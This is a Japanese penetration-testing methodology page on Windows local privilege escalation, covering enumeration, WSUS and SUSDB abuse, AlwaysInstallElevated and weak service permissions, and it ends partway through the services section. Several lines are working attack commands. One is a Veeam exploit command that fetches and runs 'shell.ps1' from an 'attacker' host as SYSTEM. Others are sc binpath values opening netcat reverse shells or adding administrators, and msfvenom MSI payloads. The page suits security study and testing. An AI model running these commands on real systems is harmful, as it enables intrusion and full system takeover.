# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows ローカル権限昇格ベクトルを探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、複数の基礎的なガイドに基づく、Windows 権限昇格の一般的な methodology をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な enumeration の流れは、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の attack に関する資料には、Windows 権限昇格に関する DerbyCon のプレゼンテーションも含まれています。<sup>[[5]](#references)</sup>

## Windows 基礎理論

### Access Tokens

**Windows の access tokens が何かわからない場合は、続行する前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows における integrity levels が何かわからない場合は、続行する前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**system の enumeration を妨げたり**、実行ファイルを実行したり、さらには**活動を検知したりする**可能性のあるさまざまな要素があります。権限昇格の enumeration を開始する前に、次の**ページを読み**、これらすべての**防御** **mechanisms** を**enumerate**する必要があります:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがある場合、offline UEFI NVRAM の編集を、pre-boot DMA と Windows の `SYSTEM` memory-patching chain に変えることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` を通じて起動された UIAccess processes は、AppInfo の secure-path checks を bypass できる場合、prompt なしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow については、こちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、privileged local NTLM authentication が再利用された SMB TCP connection を介して reflect される、**SMB arbitrary-port** LPE path も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability が存在するか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのsecurity vulnerabilitiesに関する詳細な情報を検索するのに便利です。このdatabaseには4,700件を超えるsecurity vulnerabilitiesが登録されており、Windows環境がもたらす**massive attack surface**を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitsのGithub repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variablesに保存されたcredential/Juicy infoはあるか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) でこれを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline の実行詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、完全な実行詳細や出力結果が取得されない場合があります。

有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs の最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティ記録と全コンテンツ記録が取得され、コードのすべてのブロックが実行時に文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、forensicsや悪意のある動作の分析に役立ちます。実行時にすべてのアクティビティを文書化することで、プロセスに関する詳細な情報が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のイベントログは、Windows Event Viewer の次のパスにあります：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の20件のイベントを表示するには、次を使用します：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet 設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使用して要求されている場合、system を compromise できます。

まず、cmd で以下を実行して、network が non-SSL WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellでは次のようにします:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信が返ってきた場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

**悪用可能です。** 最後のレジストリ値が `0` と等しい場合、WSUS エントリは無視されます。

これらの脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、SSL で保護されていない WSUS トラフィックに `'fake'` update を注入するための MiTM weaponized exploits scripts です。

research の詳細はこちらをご覧ください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、この bug が悪用する flaw は次のとおりです。

> ローカル user proxy を変更する権限があり、Windows Updates が Internet Explorer の設定で構成された proxy を使用している場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自身の traffic を intercept し、asset 上で elevated user として code を実行できます。
>
> さらに、WSUS service は current user の settings を使用するため、その certificate store も使用します。WSUS hostname 用の self-signed certificate を生成し、その certificate を current user の certificate store に追加すれば、HTTP と HTTPS の両方の WSUS traffic を intercept できます。WSUS は、certificate に対する trust-on-first-use 型の validation を実装するために、HSTS に類似した mechanism を使用していません。提示された certificate が user によって trusted であり、正しい hostname を持っていれば、service に受け入れられます。

この vulnerability は、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool（liberated された後）を使用して exploit できます。

### SUSDB custom-update abuse: `.txt`/`.esd` 経由の unsigned payloads

これは、HTTP WSUS connection を intercept する場合とは異なる trust-boundary failure です。prerequisite は、custom update を publish および approve するために、**WSUS database (`SUSDB`) の stored procedures** に十分な access があることです。実用的な entry path の 1 つは、upstream WSUS computer account を、`SUSDB` をホストする別の MSSQL server に relay することです。正確な prerequisite は deployment ごとに異なるため、SQL administrator rights があると仮定せず、まず `EXECUTE` permissions を enumerate してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS client authentication を HTTP/8530 から LDAP、SMB、または AD CS に relay する別の attack path については、[Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) を参照してください。

#### update の Build、target、approve

custom-update workflow は、legitimate な WSUS procedures を restricted publishing API として使用します。重要な state transitions は次のとおりです。<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| update metadata の Import | `spImportUpdate` |
| prerequisite、localized、extended XML fragments の Store | `spSaveXMLFragment` |
| content digest と attacker-controlled URL の Associate | `spSetBatchURL` |
| computer group の Enumerate/create と client の追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| その group に対する installation の Approve | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

file name、digests、size、`CommandLineInstallation` handler は、import された metadata/fragments 間で一致している必要があります。content URL と target group を assign した後の最終的な approval は、次のようになります。example の GUIDs を replay するのではなく、新しい update、group、deployment identifiers を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### 拡張子駆動の署名バイパス

WSUS は通常、任意の未署名の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` では、.NET の `VerifyFile` パスが、指定されたファイル名が `.txt` または `.esd` で終わる場合に証明書チェックフラグを false に設定します。その結果、バイト列がテキストまたは正当な ESD イメージであることを事前に確認しないまま、`CheckCertificateSignature` がスキップされます。したがって、`payload.exe.txt` のような名前を付けただけの変更されていない PE が content verification を通過し、その後、update の command-line installation handler によって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同による bug です。<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS-compatible staging と automation

`spDeployUpdate` を呼び出すと、WSUS は登録されたコンテンツを取得します。origin は BITS の HTTP 要件を満たす必要があります。到達可能な URL だけでは不十分です。転送では初期の `HEAD`/`GET` フローと byte-range requests が使用されるためです。Range をサポートしていないサーバーでは、BITS に Range protocol header が必要であることを示す WSUS synchronization `EventId=364` が生成されます。<sup>[[39]](#references)</sup>

研究用 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) は、import/fragment/URL/group/deployment chain に必要な SQL を生成し、それを実行するための modified MSSQL client を含み、content staging 用の `BitsWebServer.py` を提供します。authorized lab での最小限の invocation は次のとおりです。<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### 無人実行と再試行による永続化

Client-side interaction はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの update が、ユーザーによる手動選択なしに、設定されたスケジュールで download および install されます。テストでは、update が failed/incomplete のままになった payload は、callback process の終了後すぐに再度提示されたため、retry behavior が繰り返しの execution persistence になり得ます。ただし、client に update-failed state が表示されるため、発見されやすくなります。<sup>[[39]](#references)</sup>

#### 検知と hardening の pivot

この chain から利用できる server-side および client-side の pivot は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を audit します。新しい targeting group、外部 content origin、`.txt`/`.esd` update payload、および想定外の principal（特に computer account 以外）によって実行された deployment を調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認します。suffix を盲信せず、payload extension と content magic に基づいて verification と相関させます。
- Windows Update の installation が繰り返し failed/retry している状態、および `.txt` または `.esd` の名前を持つ content からの PE execution や、予期しない child/network activity を hunt します。
- サポートされている場合は database service に Extended Protection for Authentication を要求し、database への network access を WSUS server と承認済みの administrative system に制限します。custom-update procedure に対する `EXECUTE` rights を最小化し、audit します。

## Third-Party Auto-Updaters と Agent IPC (local privesc)

多くの enterprise agent は localhost IPC surface と privileged update channel を公開しています。enrollment を attacker server に強制でき、updater が rogue root CA または弱い signer check を信頼する場合、local user は悪意のある MSI を配信し、SYSTEM service に install させることができます。一般化された technique（Netskope stAgentSvc chain – CVE-2025-0309 に基づく）については、こちらを参照してください:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由の SYSTEM)

Veeam B&R < `11.0.1.1261` は、**TCP/9401** 上で localhost service を公開しており、attacker-controlled message を処理することで、**NT AUTHORITY\SYSTEM** として任意の command を実行できます。<sup>[[12]](#references)</sup>

- **Recon**: listener と version を確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`
- **Exploit**: 必要な Veeam DLL とともに `VeeamHax.exe` などの PoC を同じ directory に配置し、local socket 経由で SYSTEM payload を trigger します:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

特定の条件下では、Windows **domain** 環境に **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる self-rights を持っていること、そしてユーザーが domain 内にコンピューターを作成できることが含まれます。重要な点として、これらの **requirements** はデフォルト設定で満たされます。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit** を確認してください。

攻撃の流れの詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

**これら2つのレジストリが** **有効**（値が **0x1**）になっている**場合**、あらゆる privilege のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
meterpreter sessionがある場合は、モジュール **`exploit/windows/local/always_install_elevated`** を使用してこの technique を自動化できます。

### PowerUP

power-upの `Write-UserAddMSI` commandを使用すると、権限昇格用のWindows MSI binaryをcurrent directory内に作成できます。このscriptは、user/groupの追加を求めるprecompiled MSI installerを書き出します（そのため、GIU accessが必要です）。
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このツールを使用して MSI wrapper を作成する方法については、このチュートリアルを読んでください。**command lines** の**実行**だけが目的であれば、"**.bat**" ファイルを wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit で **new Windows EXE TCP payload** を**生成**し、`C:\privesc\beacon.exe` に保存します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（例: **AlwaysPrivesc**）を付け、場所に **`C:\privesc`** を指定し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- 手順 3/4（含めるファイルの選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックし、先ほど生成した Beacon payload を選択します。その後、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされた app をより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、installer の実行直後に beacon payload が実行されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、platform が x64 に設定されていることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの**installation**を**background**で実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と検出機能

### 監査設定

これらの設定によって**ログ記録される**内容が決まるため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingでは、ログがどこに送信されるのかを把握しておくと有用です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、ドメインに参加しているコンピューター上の **ローカル Administrator パスワードの管理** を目的として設計されており、各パスワードが **一意で、ランダム化され、定期的に更新される** ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによる **メモリの読み取り** やコードのインジェクトの試行を **ブロック** して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威から、デバイスに保存されている credentials を保護することです。[**Credential Guard の詳細情報はこちらです。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン資格情報**は **Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに、興味深い権限がないか確認する必要があります
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**特権グループに所属している場合、privilege escalation が可能なことがあります**。特権グループと、それらを abuse して privilege escalation する方法については、こちらをご覧ください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について**詳しく学べます**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深いtoken**と、それらを abuse する方法について**学んでください**:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示する際は、**プロセスのコマンドライン内にパスワードがないか確認**します。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があり、[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できる可能性がないか確認します:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の [**electron/cef/chromium debuggers** がないか確認してください。これを悪用して privileges を escalate できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

**processes の binaries の permissions を確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリがあるフォルダーの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリからのパスワード抽出

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、**メモリ内に認証情報を平文で保持している**ため、メモリをダンプして認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全でない GUI アプリ

**SYSTEM として実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で、"command prompt" を検索し、"Click to open Command Prompt" をクリックします。

## Services

Service Triggers により、特定の条件（named pipe/RPC endpoint のアクティビティ、ETW events、IP の利用可能性、デバイスの接続、GPO refresh など）が発生したときに Windows が service を起動できます。SERVICE_START rights がなくても、trigger を発生させることで privileged services を起動できる場合があります。enumeration および activation techniques については、こちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

services の一覧を取得します:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことが推奨されます。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が変更可能なサービスがないか確認することを推奨します：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化

SSDPSRV などで次のエラーが発生する場合:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次のコマンドを使用して有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存します（XP SP1 の場合）**

この問題に対する**別の回避策**は、次を実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

"Authenticated users" グループがサービスに対して **SERVICE_ALL_ACCESS** を保有しているシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、さまざまな permission を通じて escalation できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再構成を許可します。
- **WRITE_DAC**: permission の再構成を可能にし、service configuration を変更できるようにします。
- **WRITE_OWNER**: ownership の取得と permission の再構成を許可します。
- **GENERIC_WRITE**: service configuration を変更する能力を継承します。
- **GENERIC_ALL**: service configuration を変更する能力も継承します。

この vulnerability の detection と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

service が **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または privileged domain account として実行されている一方で、**low-privileged users が service EXE またはその parent folder を変更できる場合**、**binary を置き換えて service を再起動する**ことで、service を hijack できることがあります。

**service によって実行される binary を変更できるか**、または binary が存在する**folder に write permissions があるか**を確認します（[**DLL Hijacking**](dll-hijacking/index.html)**.**）\
**wmic**（system32 にはありません）を使用すると、service によって実行されるすべての binary を取得でき、**icacls** で permission を確認できます。
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
